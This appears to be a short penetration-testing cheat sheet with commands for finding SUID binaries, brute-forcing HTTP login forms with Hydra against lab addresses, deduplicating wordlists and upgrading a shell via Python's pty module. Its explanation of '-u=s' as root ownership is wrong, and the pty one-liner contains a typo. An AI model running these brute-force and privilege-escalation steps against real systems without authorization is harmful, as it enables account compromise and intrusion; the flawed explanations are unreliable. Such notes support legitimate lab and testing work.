Find all files with SUID bit

    find / -perm -u=s -type f 2>/dev/null

or

    find / -perm -4000 -type f 2>/dev/null

Explanation:

    /denotes  start from the top (root) of the file system and find every directory
    -permdenotes search for the permissions that follow
    -u=sdenotes look for files that are owned by the root user
    -typestates the type of file we are looking for
    f denotes a regular file not the directories or special files
    2 denotes to the second file descriptor of the process, i.e. stderr (standard error)
    > means redirection
    /dev/null is a special filesystem object that throws away everything written into it.


Hydra Password Bruteforce

    hydra 192.168.1.69 http-form-post "/w3af/bruteforce/form_login/dataReceptor.php:user=^USER^&pass=^PASS^:Bad login" -L users.txt -P pass.txt -t 10 -w 30 -o hydra-http-post-attack.txt




    
Explanation:

    Host = 192.168.1.69
    Method = http-form-post
    URL = /w3af/bruteforce/form_login/dataReceptor.php
    Form parameters = user=^USER^&pass=^PASS^
    Failure response = Bad login
    Users file = users.txt
    Password file = pass.txt
    Threads = -t 10
    Wait for timeout = -w 30
    Output file = -o hydra-http-post-attack.txt


Other example

	hydra 111.11.111.11 http-form-post "/:password=^PASS^:Invalid" -P /usr/share/wordlists/rockyou.txt -l user -t 10 -s 42616 -v

This attacks the ip address on port 42616
To remove all duplicates in a dictionary file

    cat filename.txt | sort | uniq > outfile.txt

Spawn bash

    python -c 'import.pty;pty.spawn("/bin/bash")'






	

